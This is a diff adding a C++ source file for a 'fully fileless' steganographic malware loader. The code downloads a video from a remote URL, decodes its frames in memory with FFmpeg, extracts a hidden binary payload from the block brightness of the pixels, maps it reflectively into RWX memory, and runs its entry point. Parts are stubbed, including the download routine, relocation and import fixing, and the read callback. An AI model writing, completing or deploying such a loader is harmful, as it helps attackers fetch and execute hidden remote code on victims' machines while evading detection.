@@ -1,0 +1,216 @@
+// memory_only_stego_loader.cpp
+// Fully fileless: download video → decode in mem → extract bits → reflective PE exec
+
+#include <windows.h>
+#include <winhttp.h>
+#include <wincrypt.h>
+#include <vector>
+#include <string>
+#include <iostream>
+#include <cstdint>
+
+// FFmpeg includes (link libavformat, libavcodec, libavutil, libswscale)
+extern "C" {
+#include <libavformat/avformat.h>
+#include <libavcodec/avcodec.h>
+#include <libavutil/imgutils.h>
+#include <libswscale/swscale.h>
+}
+
+// ──────────────────────────────────────────────────────────────
+// 1. Reflective PE Loader (simplified; use full MemoryModule/Donut for robust)
+typedef BOOL(WINAPI* ReflectiveLoadFunc)(PVOID peBuffer, DWORD peSize, PVOID* entryPoint);
+BOOL ReflectiveLoadPE(PVOID peBuffer, DWORD peSize, PVOID* entryPoint) {
+    // Full impl skeleton – parse PE, allocate image, copy sections, fix relocs/imports, call entry
+    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)peBuffer;
+    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
+
+    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)peBuffer + dosHeader->e_lfanew);
+    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return FALSE;
+
+    // Allocate memory at preferred base if possible, else anywhere
+    PVOID imageBase = VirtualAlloc((PVOID)ntHeaders->OptionalHeader.ImageBase,
+                                   ntHeaders->OptionalHeader.SizeOfImage,
+                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!imageBase) {
+        imageBase = VirtualAlloc(NULL, ntHeaders->OptionalHeader.SizeOfImage,
+                                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        if (!imageBase) return FALSE;
+    }
+
+    // Copy headers + sections (simplified – add relocs, imports, TLS in real impl)
+    memcpy(imageBase, peBuffer, ntHeaders->OptionalHeader.SizeOfHeaders);
+    IMAGE_SECTION_HEADER* section = IMAGE_FIRST_SECTION(ntHeaders);
+    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i, ++section) {
+        memcpy((BYTE*)imageBase + section->VirtualAddress,
+               (BYTE*)peBuffer + section->PointerToRawData,
+               section->SizeOfRawData);
+    }
+
+    // Fix relocations if base != preferred (stub – implement delta calc)
+    // Resolve imports (LoadLibrary/GetProcAddress loop – stub)
+
+    // Call entry point (EXE style: no DllMain, use AddressOfEntryPoint)
+    DWORD entryRVA = ntHeaders->OptionalHeader.AddressOfEntryPoint;
+    *entryPoint = (PVOID)((BYTE*)imageBase + entryRVA);
+    return TRUE;
+}
+
+// ──────────────────────────────────────────────────────────────
+// 2. In-memory video decode + bit extraction (FFmpeg-based)
+std::vector<BYTE> ExtractPayloadFromMemoryVideo(const std::vector<BYTE>& videoBytes) {
+    std::vector<BYTE> payload;
+
+    // Create in-memory AVIOContext for FFmpeg
+    AVIOContext* avioCtx = nullptr;
+    unsigned char* buffer = (unsigned char*)av_malloc(videoBytes.size() + AV_INPUT_BUFFER_PADDING_SIZE);
+    if (!buffer) return payload;
+    memcpy(buffer, videoBytes.data(), videoBytes.size());
+    avioCtx = avio_alloc_context(buffer, videoBytes.size(), 0, nullptr,
+                                 [](void* opaque, uint8_t* buf, int buf_size) -> int {
+                                     // Custom read callback if needed; here we use static buffer
+                                     return -1; // Stub – full impl needs seek/read
+                                 }, nullptr, nullptr);
+    if (!avioCtx) { av_free(buffer); return payload; }
+
+    AVFormatContext* fmtCtx = avformat_alloc_context();
+    fmtCtx->pb = avioCtx;
+    if (avformat_open_input(&fmtCtx, nullptr, nullptr, nullptr) < 0) {
+        avio_context_free(&avioCtx);
+        return payload;
+    }
+
+    if (avformat_find_stream_info(fmtCtx, nullptr) < 0) goto cleanup;
+
+    int videoStream = -1;
+    for (unsigned i = 0; i < fmtCtx->nb_streams; ++i) {
+        if (fmtCtx->streams[i]->codecpar->codec_type == AVMEDIA_TYPE_VIDEO) {
+            videoStream = i;
+            break;
+        }
+    }
+    if (videoStream == -1) goto cleanup;
+
+    AVCodecParameters* codecPar = fmtCtx->streams[videoStream]->codecpar;
+    const AVCodec* codec = avcodec_find_decoder(codecPar->codec_id);
+    if (!codec) goto cleanup;
+
+    AVCodecContext* codecCtx = avcodec_alloc_context3(codec);
+    avcodec_parameters_to_context(codecCtx, codecPar);
+    if (avcodec_open2(codecCtx, codec, nullptr) < 0) goto cleanup;
+
+    AVPacket* packet = av_packet_alloc();
+    AVFrame* frame = av_frame_alloc();
+    AVFrame* rgbFrame = av_frame_alloc();
+
+    SwsContext* swsCtx = sws_getContext(codecCtx->width, codecCtx->height, codecCtx->pix_fmt,
+                                         codecCtx->width, codecCtx->height, AV_PIX_FMT_RGB24,
+                                         SWS_BILINEAR, nullptr, nullptr, nullptr);
+
+    std::vector<uint8_t> bitstream;
+
+    while (av_read_frame(fmtCtx, packet) >= 0) {
+        if (packet->stream_index != videoStream) continue;
+
+        if (avcodec_send_packet(codecCtx, packet) < 0) continue;
+
+        while (avcodec_receive_frame(codecCtx, frame) >= 0) {
+            // Convert to RGB
+            uint8_t* dst_data[4] = {rgbFrame->data[0], nullptr, nullptr, nullptr};
+            int dst_linesize[4] = {rgbFrame->linesize[0], 0, 0, 0};
+            sws_scale(swsCtx, frame->data, frame->linesize, 0, codecCtx->height, dst_data, dst_linesize);
+
+            // Port your Python logic: grayscale mean per block
+            int h = codecCtx->height, w = codecCtx->width;
+            int pixel_size = std::min(h / 256, w / 256); if (pixel_size < 1) pixel_size = 1;
+            int h_blocks = h / pixel_size, w_blocks = w / pixel_size;
+
+            for (int r = 0; r < h_blocks; ++r) {
+                for (int c = 0; c < w_blocks; ++c) {
+                    double sum = 0.0;
+                    int count = 0;
+                    for (int dy = 0; dy < pixel_size; ++dy) {
+                        for (int dx = 0; dx < pixel_size; ++dx) {
+                            int y = r * pixel_size + dy;
+                            int x = c * pixel_size + dx;
+                            if (y >= h || x >= w) continue;
+                            uint8_t* pix = rgbFrame->data[0] + y * rgbFrame->linesize[0] + x * 3;
+                            sum += (pix[0] + pix[1] + pix[2]) / 3.0;  // grayscale mean
+                            ++count;
+                        }
+                    }
+                    double mean = sum / count;
+                    bitstream.push_back(mean < 128 ? 1 : 0);
+                }
+            }
+        }
+        av_packet_unref(packet);
+    }
+
+    // Pack bits to bytes
+    if (!bitstream.empty()) {
+        size_t num_bytes = bitstream.size() / 8;
+        payload.resize(num_bytes);
+        for (size_t i = 0; i < num_bytes; ++i) {
+            uint8_t byte = 0;
+            for (int b = 0; b < 8; ++b) {
+                byte |= (bitstream[i*8 + b] << (7 - b));
+            }
+            payload[i] = byte;
+        }
+    }
+
+cleanup:
+    sws_freeContext(swsCtx);
+    av_frame_free(&rgbFrame);
+    av_frame_free(&frame);
+    av_packet_free(&packet);
+    avcodec_free_context(&codecCtx);
+    avformat_close_input(&fmtCtx);
+    avio_context_free(&avioCtx);
+    return payload;
+}
+
+// ──────────────────────────────────────────────────────────────
+// 3. Download to memory (same as before)
+bool DownloadToMemory(const std::wstring& url, std::vector<BYTE>& buffer) {
+    // ... (your previous WinHTTP download code – unchanged, returns buffer filled)
+    // Implement as before
+    return !buffer.empty();
+}
+
+// ──────────────────────────────────────────────────────────────
+// Main: fully in-memory
+int wmain() {
+    const std::wstring videoUrl = L"https://rr1---sn-...";  // your long URL
+
+    std::vector<BYTE> videoData;
+    if (!DownloadToMemory(videoUrl, videoData)) {
+        std::wcerr << L"Download failed.\n";
+        return 1;
+    }
+
+    std::wcout << L"Downloaded " << videoData.size() << L" bytes.\n";
+
+    std::vector<BYTE> payload = ExtractPayloadFromMemoryVideo(videoData);
+    if (payload.empty()) {
+        std::wcerr << L"Extraction failed.\n";
+        return 1;
+    }
+
+    std::wcout << L"Extracted payload: " << payload.size() << L" bytes.\n";
+
+    PVOID entry = nullptr;
+    if (!ReflectiveLoadPE(payload.data(), payload.size(), &entry)) {
+        std::wcerr << L"Reflective load failed.\n";
+        return 1;
+    }
+
+    if (entry) {
+        // Run in current process (for EXE: may need args/environment fix)
+        ((void(*)())entry)();
+        std::wcout << L"Payload executed in memory.\n";
+    }
+
+    return 0;
+}
